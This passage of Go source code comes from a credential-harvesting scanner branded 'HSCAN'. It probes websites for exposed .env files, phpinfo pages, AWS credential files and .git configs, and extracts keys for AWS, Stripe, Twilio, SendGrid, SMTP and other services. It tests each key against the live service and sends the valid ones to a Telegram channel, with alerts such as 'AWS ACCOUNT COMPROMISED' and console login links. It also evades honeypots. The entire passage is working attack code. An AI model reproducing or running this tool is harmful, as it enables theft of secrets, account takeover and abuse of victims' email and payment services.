	req, _ := http.NewRequest("GET", fmt.Sprintf("https://api.twilio.com/2010-04-01/Accounts/%s.json", sid), nil)
	req.SetBasicAuth(sid, auth)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			status, _ := res["status"].(string)
			friendlyName, _ := res["friendly_name"].(string)

			a.logValid("Twilio", fmt.Sprintf("SID: %s | Status: %s", sid, status))
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceURL, sid, auth), "valid_twilio.txt")
			a.storeValidKeyLimit("Twilio", sid, fmt.Sprintf("%s (%s)", friendlyName, status))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
📞 <b>TWILIO LIVE ACCOUNT</b>

🆔 <b>SID:</b> <code>%s</code>
🔐 <b>Auth:</b> <code>%s</code>
📶 <b>Status:</b> %s
🔗 <b>Source:</b> %s
`, sid, auth, status, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas SendGrid
func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
	if !a.Config.APIValidation.SendGrid { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/user/credits", nil)
	req.Header.Set("Authorization", "Bearer "+key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			total, _ := res["total"].(float64)

			a.logValid("SendGrid", key)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_sendgrid.txt")
			a.storeValidKeyLimit("SendGrid", key, fmt.Sprintf("%.0f Total Credits", total))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
📧 <b>SENDGRID KEY FOUND</b>

🔑 <b>Key:</b> <code>%s</code>
📊 <b>Limit:</b> %.0f Total Credits
🔗 <b>Source:</b> %s
`, key, total, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Stripe
func (a *AWSScanner) CheckStripe(key, sourceURL string) bool {
	if !a.Config.APIValidation.Stripe { // Pengecekan fitur baru
		return false
	}
	
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, _ := http.NewRequest("GET", "https://api.stripe.com/v1/balance", nil)
	req.SetBasicAuth(key, "")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			liveMode, _ := res["livemode"].(bool)

			mode := "Test"
			if liveMode {
				mode = "Live"
			}

			a.logValid("Stripe", fmt.Sprintf("Key: %s | Mode: %s", key, mode))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_stripe.txt")
			a.storeValidKeyLimit("Stripe", key, mode)

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
💳 <b>STRIPE LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
💰 <b>Mode:</b> %s
🔗 <b>Source:</b> %s
`, key, mode, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Mailgun
func (a *AWSScanner) CheckMailgun(key, sourceURL string) bool {
	if !a.Config.APIValidation.Mailgun { // Pengecekan fitur baru
		return false
	}
	
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, _ := http.NewRequest("GET", "https://api.mailgun.net/v3/domains", nil)
	req.SetBasicAuth("api", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			total, _ := res["total_count"].(float64)

			a.logValid("Mailgun", fmt.Sprintf("Key: %s | Domains: %.0f", key, total))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_mailgun.txt")
			a.storeValidKeyLimit("Mailgun", key, fmt.Sprintf("%.0f Domains", total))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
🔫 <b>MAILGUN LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
🌐 <b>Domains:</b> %.0f
🔗 <b>Source:</b> %s
`, key, total, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Telnyx
func (a *AWSScanner) CheckTelnyx(key, sourceURL string) bool {
	if !a.Config.APIValidation.Telnyx { // Pengecekan fitur baru
		return false
	}
	
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, _ := http.NewRequest("GET", "https://api.telnyx.com/v2/user/balance", nil)
	req.Header.Set("Authorization", "Bearer "+key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			data, _ := res["data"].(map[string]interface{})
			balance, _ := data["balance"].(string)
			currency, _ := data["currency"].(string)

			a.logValid("Telnyx", fmt.Sprintf("Key: %s | Balance: %s %s", key, balance, currency))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_telnyx.txt")
			a.storeValidKeyLimit("Telnyx", key, fmt.Sprintf("%s %s", balance, currency))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
📞 <b>TELNYX LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
💰 <b>Balance:</b> %s %s
🔗 <b>Source:</b> %s
`, key, balance, currency, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas MessageBird
func (a *AWSScanner) CheckMessageBird(key, sourceURL string) bool {
	if !a.Config.APIValidation.MessageBird { // Pengecekan fitur baru
		return false
	}
	
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Endpoint untuk memeriksa status API key
	req, _ := http.NewRequest("GET", "https://rest.messagebird.com/balance", nil)
	req.Header.Set("Authorization", "AccessKey "+key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			amount, _ := res["amount"].(float64)
			currency, _ := res["currency"].(string)

			a.logValid("MessageBird", fmt.Sprintf("Key: %s | Balance: %.2f %s", key, amount, currency))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_messagebird.txt")
			a.storeValidKeyLimit("MessageBird", key, fmt.Sprintf("%.2f %s", amount, currency))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
🐦 <b>MESSAGEBIRD LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
💰 <b>Balance:</b> %.2f %s
🔗 <b>Source:</b> %s
`, key, amount, currency, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Nexmo/Vonage
func (a *AWSScanner) CheckNexmo(key, secret, sourceURL string) bool {
	if !a.Config.APIValidation.Nexmo { // Pengecekan fitur baru
		return false
	}
	
	pair := key + ":" + secret
	if _, loaded := a.KnownKeys.LoadOrStore(pair, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	url := fmt.Sprintf("https://rest.nexmo.com/account/get-balance?api_key=%s&api_secret=%s", key, secret)
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Accept", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			value, _ := res["value"].(float64)

			a.logValid("Nexmo", fmt.Sprintf("Key: %s | Balance: %.2f EUR", key, value))
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceURL, key, secret), "valid_nexmo.txt")
			a.storeValidKeyLimit("Nexmo", key, fmt.Sprintf("%.2f EUR", value))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
💬 <b>NEXMO/VONAGE LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔐 <b>Secret:</b> <code>%s</code>
💰 <b>Balance:</b> %.2f EUR
🔗 <b>Source:</b> %s
`, key, secret, value, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
	if !a.Config.ScanningFeatures.SMTPCredentialsScan { // Pengecekan fitur baru
		return
	}
	host := ""
	port := ""
	user := ""
	pass := ""
	from := ""

	isPhpInfo := strings.Contains(text, "phpinfo()") || strings.Contains(text, "Configuration File (php.ini) Path")

	if isPhpInfo {
		host = extractValueFromPhpInfoTable(text, "MAIL_HOST")
		if host == "" {
			host = extractValueFromPhpInfoTable(text, "SMTP_HOST")
		}
		port = extractValueFromPhpInfoTable(text, "MAIL_PORT")
		if port == "" {
			port = extractValueFromPhpInfoTable(text, "SMTP_PORT")
		}
		user = extractValueFromPhpInfoTable(text, "MAIL_USERNAME")
		if user == "" {
			user = extractValueFromPhpInfoTable(text, "SMTP_USER")
		}
		pass = extractValueFromPhpInfoTable(text, "MAIL_PASSWORD")
		if pass == "" {
			pass = extractValueFromPhpInfoTable(text, "SMTP_PASSWORD")
		}
		from = extractValueFromPhpInfoTable(text, "MAIL_FROM_ADDRESS")
		if from == "" {
			from = extractValueFromPhpInfoTable(text, "MAIL_FROM")
		}

	} else {
		if m := a.SMTPHostPattern.FindStringSubmatch(text); len(m) > 1 {
			host = m[1]
		}
		if m := a.SMTPPortPattern.FindStringSubmatch(text); len(m) > 1 {
			port = m[1]
		}
		if m := a.SMTPUserPattern.FindStringSubmatch(text); len(m) > 1 {
			user = m[1]
		}
		if m := a.SMTPPassPattern.FindStringSubmatch(text); len(m) > 1 {
			pass = m[1]
		}
		if m := a.SMTPFromPattern.FindStringSubmatch(text); len(m) > 1 {
			from = m[1]
		}
	}

	if host != "" && port != "" && user != "" && pass != "" && from != "" {
		smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
		a.logFound("SMTP", smtpLine, sourceURL)
		a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, smtpLine), "smtp_found.txt")

		if a.Config.SMTPTestEmail == "" {
			return
		}

		addr := fmt.Sprintf("%s:%s", host, port)
		auth := smtp.PlainAuth("", user, pass, host)
		msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: HScan Test\r\n\r\nTest Email.", from, a.Config.SMTPTestEmail)

		timeout := 15 * time.Second
		done := make(chan error, 1)

		go func() {
			done <- smtp.SendMail(addr, auth, from, []string{a.Config.SMTPTestEmail}, []byte(msg))
		}()

		select {
		case err := <-done:
			if err == nil {
				a.logValid("SMTP", smtpLine)

				globalCounters.mu.Lock()
				globalCounters.ValidSMTP++
				globalCounters.mu.Unlock()

				tlgMsg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
📨 <b>SMTP CRACKED</b>

🖥️ <b>Host:</b> <code>%s</code>
🔌 <b>Port:</b> <code>%s</code>
👤 <b>User:</b> <code>%s</code>
🔑 <b>Pass:</b> <code>%s</code>
📧 <b>From:</b> %s
🔗 <b>Source:</b> %s
`, host, port, user, pass, from, sourceURL)
				go a.sendTelegram(tlgMsg)
				a.storeValidKeyLimit("SMTP", host, "Email Sent")
			} else {
				pterm.Debug.Printfln("[SMTP FAIL] %s: %v", host, err)
			}
		case <-time.After(timeout):
			pterm.Debug.Printfln("[SMTP TIMEOUT] %s: Operation timed out after %v", host, timeout)
		}
	}
}

func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
	honeypotBaitPattern := regexp.MustCompile(`(?i)(SK_TEST_9999999999999999|AKIAIOSFODNN7EXAMPLEFAKE|KEY_FAKE_DO_NOT_USE)`)
	if honeypotBaitPattern.MatchString(text) {
		pterm.Error.Printfln("[HONEYPOT DETECTED] Skipping domain due to bait pattern in %s", sourceURL)
		return
	}

	sanitizedText := text

	base64Candidates := base64CandidatePattern.FindAllString(text, -1)

	for _, candidate := range base64Candidates {
		decoded := tryDecodeBase64(candidate)
		if decoded != "" {
			sanitizedText += "\n" + decoded
		}
	}

	contentToScan := sanitizedText

	apiChecks := []struct {
		Pattern *regexp.Regexp
		Feature bool
		Name string
		CheckFn func(key, sourceURL string) bool
	}{
		{a.SendGridAPIKeyPattern, a.Config.APIValidation.SendGrid, "SendGrid", a.CheckSendGrid},
		{a.StripePattern, a.Config.APIValidation.Stripe, "Stripe", a.CheckStripe},
		{a.GitHubAccessTokenPattern, a.Config.APIValidation.GitHub, "GitHub", a.CheckGitHubToken}, // Menggunakan flag APIValidation yang sekarang ada
		{a.MailgunAPIKeyPattern, a.Config.APIValidation.Mailgun, "Mailgun", a.CheckMailgun},
		{a.TelnyxApiPatternInfo, a.Config.APIValidation.Telnyx, "Telnyx", a.CheckTelnyx},
		{a.OpenAIAPIPattern, a.Config.APIValidation.OpenAI, "OpenAI", a.CheckOpenAI},
		{a.GCPAPIKeyPattern, a.Config.APIValidation.GCPAPIKey, "GCP Key", a.CheckGCPKey},
		{a.AnthropicPattern, a.Config.APIValidation.Anthropic, "Anthropic", a.CheckAnthropic},
		{a.MessageBirdPattern, a.Config.APIValidation.MessageBird, "MessageBird", a.CheckMessageBird},
	}

	var wg sync.WaitGroup

	for _, check := range apiChecks {
		if check.Feature { // Hanya jalankan jika diaktifkan di APIValidation
			keys := unique(check.Pattern.FindAllString(contentToScan, -1))
			for _, key := range keys {
				a.logFound(check.Name, key, sourceURL)
				wg.Add(1)
				go func(k, url string, fn func(string, string) bool) {
					defer wg.Done()
					fn(k, url)
				}(key, sourceURL, check.CheckFn)
			}
		}
	}

	nonValidatedChecks := []struct {
		Pattern *regexp.Regexp
		Name string
	}{
		// Memindahkan pengecekan yang tidak divalidasi ke sini (Azure, Aliyun)
		{a.AzureSASTokenPattern, "Azure SAS Token"},
		{a.AliyunAccessKeyPattern, "Aliyun Access Key ID"},
		// Brevo/XSMTP dan sejenisnya, yang pola regexnya ada tapi tidak ada fungsi validasi,
		// bisa ditambahkan di sini. Untuk saat ini kita fokus pada yang sudah ada.
	}

	for _, check := range nonValidatedChecks {
		keys := unique(check.Pattern.FindAllString(contentToScan, -1))
		for _, key := range keys {
			if _, loaded := a.KnownKeys.LoadOrStore(key, true); !loaded {
				a.logFound(check.Name, key, sourceURL)
				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), strings.ReplaceAll(check.Name, " ", "_")+"_found.txt")

				globalCounters.mu.Lock()
				globalCounters.APIsFoundTotal++
				globalCounters.mu.Unlock()
			}
		}
	}

	if a.Config.ScanningFeatures.AWSMainScan { // Menggunakan flag baru untuk AWS
		// Gabungkan semua potensi Access Key: AKIA (Standar) dan ASIA (SES/Federated/Temporary)
		sesKeys := unique(a.AWSSESUserPattern.FindAllString(contentToScan, -1))
		sks := unique(a.AWSSecretKeyPatternInfo.FindAllString(contentToScan, -1))
		sessionTokens := unique(a.AWSSessionTokenPattern.FindAllString(contentToScan, -1))

		// 1. Validasi semua pasangan AK (AKIA/ASIA) dan SK
		for _, ak := range sesKeys {
			for _, sk := range sks {
				if len(sk) == 40 {
					keyPair := fmt.Sprintf("%s:%s", ak, sk)
					
					// Gunakan KnownKeys untuk mencegah API call ganda dari goroutine yang berbeda
					if _, loaded := a.KnownKeys.LoadOrStore(keyPair, true); loaded {
						continue
					}
					
					// Check for specific SES prefix to distinguish log output
					name := "AWS (Standard/SES Potential)"
					if strings.HasPrefix(ak, "ASIA") {
						name = "AWS (SES/Federated Potential)"
					}

					a.logFound(name, keyPair, sourceURL)
					globalCounters.mu.Lock()
					globalCounters.APIsFoundTotal++
					globalCounters.mu.Unlock()

					// Lakukan validasi penuh (STS:GetCallerIdentity) di goroutine
					wg.Add(1)
					go func(ak, sk, u, keyName string) {
						defer wg.Done()
						pterm.Info.Printfln("[CHECK] Validating %s Key: %s...", keyName, ak[:8]+"...")

						valid, identity, cfg, s3Status := a.validateAWSCredentials(ak, sk, "")
						
						if valid {
							// Jika valid, handle sebagai kunci AWS yang sah
							a.handleValidAWS(ak, sk, "", u, identity, cfg, s3Status)
							globalCounters.mu.Lock()
							globalCounters.APIsValidated++
							globalCounters.mu.Unlock()
						} else {
							// Jika gagal validasi, simpan sebagai potential key yang belum terverifikasi
							a.saveIntoFile(fmt.Sprintf("%s:%s:%s", u, ak, sk), "aws_ses_potential_unverified.txt")
							pterm.Debug.Printfln("[AWS FAIL] Key %s failed full STS validation.", ak[:8]+"...")
						}
					}(ak, sk, sourceURL, name)
				}
			}
		}

		// 2. Validasi pasangan AK, SK, dan Session Token (AKIA/ASIA + SK + ST)
		for _, ak := range sesKeys {
			for _, sk := range sks {
				for _, st := range sessionTokens {
					keyTriplet := fmt.Sprintf("%s:%s:%s", ak, sk, st)

					if _, loaded := a.KnownKeys.LoadOrStore(keyTriplet, true); loaded {
						continue
					}

					name := "AWS (Session Token)"
					a.logFound(name, keyTriplet, sourceURL)
					globalCounters.mu.Lock()
					globalCounters.APIsFoundTotal++
					globalCounters.mu.Unlock()

					wg.Add(1)
					go func(ak, sk, st, u, keyName string) {
						defer wg.Done()
						pterm.Info.Printfln("[CHECK] Validating %s Key: %s...", keyName, ak[:8]+"...")

						valid, identity, cfg, s3Status := a.validateAWSCredentials(ak, sk, st)
						if valid {
							a.handleValidAWS(ak, sk, st, u, identity, cfg, s3Status)
							globalCounters.mu.Lock()
							globalCounters.APIsValidated++
							globalCounters.mu.Unlock()
						} else {
							pterm.Debug.Printfln("[AWS FAIL] Session Key %s failed full STS validation.", ak[:8]+"...")
						}
					}(ak, sk, st, sourceURL, name)
				}
			}
		}
	}

	// Pengecekan Twilio menggunakan APIValidation
	if a.Config.APIValidation.Twilio {
		sids := unique(a.TwilioSIDPatternInfo.FindAllString(contentToScan, -1))
		auths := unique(a.TwilioAuthPatternInfo.FindAllString(contentToScan, -1))
		encoded := unique(a.TwilioEncodePatternInfo.FindAllString(contentToScan, -1))
		for _, enc := range encoded {
			if dec, err := base64.StdEncoding.DecodeString(enc); err == nil {
				parts := strings.Split(string(dec), ":")
				if len(parts) == 2 {
					sids = append(sids, parts[0])
					auths = append(auths, parts[1])
				}
			}
		}

		for _, sid := range sids {
			for _, auth := range auths {
				a.logFound("Twilio", fmt.Sprintf("%s:%s", sid, auth), sourceURL)
				wg.Add(1)
				go func(s, aT, u string) {
					defer wg.Done()
					a.CheckTwilio(s, aT, u)
				}(sid, auth, sourceURL)
			}
		}
	}

	// Pengecekan Nexmo menggunakan APIValidation
	if a.Config.APIValidation.Nexmo {
		keys := make([]string, 0)
		secrets := make([]string, 0)

		km := a.NexmoApiPatternInfo.FindAllStringSubmatch(contentToScan, -1)
		for _, m := range km {
			if len(m) > 2 {
				keys = append(keys, m[2])
			}
		}

		sm := a.NexmoSecretPatternInfo.FindAllStringSubmatch(contentToScan, -1)
		for _, m := range sm {
			if len(m) > 2 {
				secrets = append(secrets, m[2])
			}
		}

		for _, k := range unique(keys) {
			for _, s := range unique(secrets) {
				a.logFound("Nexmo", fmt.Sprintf("%s:%s", k, s), sourceURL)
				wg.Add(1)
				go func(k, s, u string) {
					defer wg.Done()
					a.CheckNexmo(k, s, u)
				}(k, s, sourceURL)
			}
		}
	}

	// Pengecekan SMTP menggunakan ScanningFeatures
	a.extractAndTestSMTP(contentToScan, sourceURL)

	a.extractAndSaveCryptoKeys(contentToScan, sourceURL)

	wg.Wait()
}

func (a *AWSScanner) handleValidAWS(ak, sk, st, sourceURL string, identity *sts.GetCallerIdentityOutput, cfg aws.Config, s3Status string) {

	keyLine := fmt.Sprintf("%s:%s", ak, sk)
	if st != "" {
		keyLine = fmt.Sprintf("%s:%s:%s", ak, sk, st)
	}

	a.logValid("AWS", fmt.Sprintf("%s (S3: %s)", keyLine, s3Status))
	a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceURL, keyLine, a.DefaultRegion), "aws_credentials.txt")
	a.saveIntoFile(fmt.Sprintf("%s:%s", ak, sk), "aws_valid.txt")

	globalCounters.mu.Lock()
	globalCounters.AWSKeysValidated++
	globalCounters.mu.Unlock()

	// Pengecekan Quota AWS menggunakan AWSChecks
	sesInfo := a.checkSESDetailsAllRegions(cfg)
	snsInfo := a.checkSNSLimitAllRegions(cfg)
	fargateInfo := a.checkFargateOnDemandLimitAllRegions(cfg)
	fedInfo := a.getFederationConsoleURL(cfg, identity, 43200)

	arnParts := strings.Split(*identity.Arn, ":")
	userOrRole := arnParts[len(arnParts)-1]
	iamAuditResult := "Skipped (Not User)"
	if strings.Contains(*identity.Arn, ":user/") {
		iamAuditResult = a.auditIAMUser(cfg, userOrRole)
	}

	var sesDetails string
	maxQuota := 0.0
	if len(sesInfo) > 0 {
		for r, d := range sesInfo {
			quota, ok := d["SendQuota"].(float64)
			if ok && quota > maxQuota {
				maxQuota = quota
			}
			sesDetails += fmt.Sprintf("  • %s: %.0f/24h (Health: %v)\n", r, quota, d["HealthStatus"])
		}
	} else {
		sesDetails = "  • No Active SES Found"
	}
	a.storeValidKeyLimit("AWS", ak, fmt.Sprintf("%.0f SES Limit / S3 Status: %s", maxQuota, s3Status))

	consoleLink := "N/A"
	if fedInfo != nil {
		consoleLink = fmt.Sprintf("<a href='%s'>LOGIN CONSOLE</a>", fedInfo["federation_console_url"])
	}

	msg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
☁️ <b>AWS ACCOUNT COMPROMISED</b>

👤 <b>User/Role:</b> <code>%s</code>
🆔 <b>Account:</b> <code>%s</code>
🔑 <b>Credentials:</b> <code>%s</code>
🔗 <b>Console:</b> %s
📦 <b>S3 Status:</b> %s
🛡️ <b>IAM Audit:</b> %s

<b>Quota & Limits (SES):</b>
%s
`, userOrRole, *identity.Account, keyLine, consoleLink, s3Status, iamAuditResult, sesDetails)

	a.saveIntoFile(fmt.Sprintf("AWS %s SES: %+v SNS: %+v Fargate: %+v IAM Audit: %s", keyLine, sesInfo, snsInfo, fargateInfo, iamAuditResult), "aws_deep_scan.txt")

	go a.sendTelegram(msg)
}

func (a *AWSScanner) createRequest(domain string) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(requestTimeoutSeconds)*time.Second)
	defer cancel()

	proto := "http"
	if strings.Contains(domain, "://") {
		parts := strings.SplitN(domain, "://", 2)
		proto, domain = parts[0], parts[1]
	}
	domain = strings.TrimRight(domain, "/")

	protocols := []string{proto}
	if proto == "http" {
		protocols = append(protocols, "https")
	}

	for _, p := range protocols {
		mainURL := fmt.Sprintf("%s://%s", p, domain)

		req, errReq := http.NewRequestWithContext(ctx, "GET", mainURL, nil)
		if errReq != nil {
			pterm.Debug.Printfln("[REQUEST CREATE ERROR] Failed to create request for %s: %v", mainURL, errReq)
			continue
		}

		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")

		resp, err := client.Do(req)

		if err != nil {
			if ctx.Err() == context.DeadlineExceeded {
				pterm.Debug.Printfln("[TIMEOUT] Request to %s timed out after %ds.", mainURL, requestTimeoutSeconds)
			} else {
				pterm.Debug.Printfln("[HTTP ERROR] %s: %v", mainURL, err)
			}
			continue
		}

		body, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()

		var wg sync.WaitGroup

		wg.Add(1)
		go func() {
			defer wg.Done()
			a.checkAndSaveKeys(string(body), mainURL)
			jsRegex := regexp.MustCompile(`src=["'](.*?.js)["']`)
			jsFiles := jsRegex.FindAllStringSubmatch(string(body), -1)
			for _, js := range jsFiles {
				if len(js) > 1 {
					fullJS := resolveURL(mainURL, js[1])
					if !a.BlacklistPattern.MatchString(fullJS) {
						if r, e := client.Get(fullJS); e == nil {
							b, _ := ioutil.ReadAll(r.Body)
							r.Body.Close()
							a.checkAndSaveKeys(string(b), fullJS)
						}
					}
				}
			}
		}()

		commonPaths := append(a.EnvPaths, a.PHPInfoPaths...)

		commonPaths = append(commonPaths, "/.aws/credentials")

		sem := make(chan struct{}, 500)
		for _, path := range commonPaths {
			wg.Add(1)
			go func(pth string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				fullURL := fmt.Sprintf("%s://%s%s", p, domain, pth)
				if r, e := client.Get(fullURL); e == nil {
					b, _ := ioutil.ReadAll(r.Body)
					r.Body.Close()
					if len(b) > 0 {
						a.checkAndSaveKeys(string(b), fullURL)
					}
				}
			}(path)
		}

		if a.Config.ScanningFeatures.GitHubTokenDeepScan { // Menggunakan flag baru
			wg.Add(1)
			go func() {
				defer wg.Done()
				headURL := fmt.Sprintf("%s://%s/.git/HEAD", p, domain)
				if r, e := client.Get(headURL); e == nil {
					b, _ := ioutil.ReadAll(r.Body)
					r.Body.Close()
					if strings.Contains(string(b), "refs/heads") || strings.Contains(string(b), "ref: refs/") {
						pterm.Warning.Printfln("[GIT EXPOSED] .git found on %s", domain)
						configURL := fmt.Sprintf("%s://%s/.git/config", p, domain)
						if rConf, eConf := client.Get(configURL); eConf == nil {
							bConf, _ := ioutil.ReadAll(rConf.Body)
							rConf.Body.Close()
							a.checkAndSaveKeys(string(bConf), configURL)
						}
					}
				}

				gitURL := fmt.Sprintf("%s://%s/.git/config", p, domain)
				if r, e := client.Get(gitURL); e == nil {
					b, _ := ioutil.ReadAll(r.Body)
					r.Body.Close()
					a.checkAndSaveKeys(string(b), gitURL)
				}
			}()
		}

		wg.Wait()
		return
	}
}

func (a *AWSScanner) ProcessTokenList(filePath string) {
	if !a.Config.ScanningFeatures.GitHubTokenDeepScan { // Pengecekan fitur baru
		pterm.Error.Println("GitHub Token Deep Scan is disabled in config.json. Skipping token list processing.")
		return
	}
	
	pterm.DefaultSection.Println("GitHub Token List Processor")

	file, err := os.Open(filePath)
	if err != nil {
		pterm.Error.Printfln("Could not open token list file '%s': %v", filePath, err)
		os.Exit(1)
	}
	defer file.Close()

	var tokens []string
	sc := bufio.NewScanner(file)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" {
			tokens = append(tokens, line)
		}
	}

	if len(tokens) == 0 {
		pterm.Warning.Println("No tokens found in the file.")
		return
	}

	pterm.Info.Printfln("Loaded %d tokens for validation.", len(tokens))

	globalCounters.URLsLoaded = len(tokens)

	a.ProgressBar, _ = pterm.DefaultProgressbar.
		WithTotal(len(tokens)).
		WithTitle("Validating GitHub Tokens").
		WithShowCount().
		WithShowElapsedTime().
		Start()

	var wg sync.WaitGroup
	sem := make(chan struct{}, 1000)

	for _, token := range tokens {
		wg.Add(1)
		sem <- struct{}{}
		go func(t string) {
			defer wg.Done()
			defer func() { <-sem }()
			// CheckGitHubToken akan secara internal memeriksa flag deep scan
			a.CheckGitHubToken(t, "Source: Token List File")
			a.ProgressBar.Increment()
		}(token)
	}
	wg.Wait()
	a.ProgressBar.Stop()
	pterm.Success.Println("Token validation complete.")
}

func (a *AWSScanner) DisplaySummary() {
	pterm.DefaultSection.Println("HSCAN RESULTS")

	apiSuccessRate := 0.0
	if globalCounters.APIsFoundTotal > 0 {
		apiSuccessRate = float64(globalCounters.APIsValidated) / float64(globalCounters.APIsFoundTotal) * 100
	}

	tokenSuccessRate := 0.0
	if globalCounters.TokensHarvested > 0 {
